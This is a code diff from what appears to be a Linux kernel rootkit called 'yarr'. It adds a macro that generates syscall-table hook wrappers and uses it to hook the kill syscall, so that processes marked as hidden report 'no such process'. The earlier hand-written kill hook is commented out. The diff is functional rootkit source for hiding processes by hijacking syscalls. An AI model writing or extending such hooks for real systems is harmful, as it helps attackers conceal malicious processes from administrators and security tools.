@@ -10,6 +10,26 @@ unsigned long *orig_sct = NULL;
 
 #define __CAST_TO_SYSCALL(ptr) ((long (*)(const struct pt_regs *))(ptr))
 
+#define YARRHOOK_DEFINE(s_name, code)                                      \
+    asmlinkage long __yarr__x64_sys_##s_name(const struct pt_regs *regs) {  \
+        long (*__x64_sys_##s_name)(const struct pt_regs *);                 \
+                                                                            \
+        if (regs == NULL) {                                                 \
+            yarr_log("regs are NULL");                                      \
+            return -1;                                                      \
+        }                                                                   \
+                                                                            \
+        {code}                                                              \
+                                                                            \
+        __x64_sys_##s_name = __CAST_TO_SYSCALL(orig_sct[__NR_##s_name]);    \
+        return __x64_sys_##s_name(regs);                                    \
+    }
+        
+YARRHOOK_DEFINE(kill,
+        if (pid_is_hidden(regs->di)) {
+            return -ESRCH;
+        })
+
 // TODO: The __yarr__x64_sys_<name>() clearly follow a pattern, we should
 // create a macro that declares all the stub needed. Pretty much as the macro
 // SYSCALL_DEFINEx() does in the kernel source.
@@ -32,23 +52,23 @@ unsigned long *orig_sct = NULL;
 //    return __x64_sys_wait4(regs);
 //}
 
-asmlinkage long __yarr__x64_sys_kill(const struct pt_regs *regs) {
-    pid_t pid;
-    long (*__x64_sys_kill)(const struct pt_regs *);
-
-    if (regs == NULL) {
-        yarr_log("regs are NULL");
-        return -1;
-    }
-
-    pid = regs->di;
-    if (pid_is_hidden(pid)) {
-        return -ESRCH;
-    }
-
-    __x64_sys_kill = __CAST_TO_SYSCALL(orig_sct[__NR_kill]);
-    return __x64_sys_kill(regs);
-}
+//asmlinkage long __yarr__x64_sys_kill(const struct pt_regs *regs) {
+//    pid_t pid;
+//    long (*__x64_sys_kill)(const struct pt_regs *);
+//
+//    if (regs == NULL) {
+//        yarr_log("regs are NULL");
+//        return -1;
+//    }
+//
+//    pid = regs->di;
+//    if (pid_is_hidden(pid)) {
+//        return -ESRCH;
+//    }
+//
+//    __x64_sys_kill = __CAST_TO_SYSCALL(orig_sct[__NR_kill]);
+//    return __x64_sys_kill(regs);
+//}
 
 int hook_syscalls(unsigned long *fake_sct, unsigned long *real_sct) {
     if (fake_sct == NULL || real_sct == NULL) {
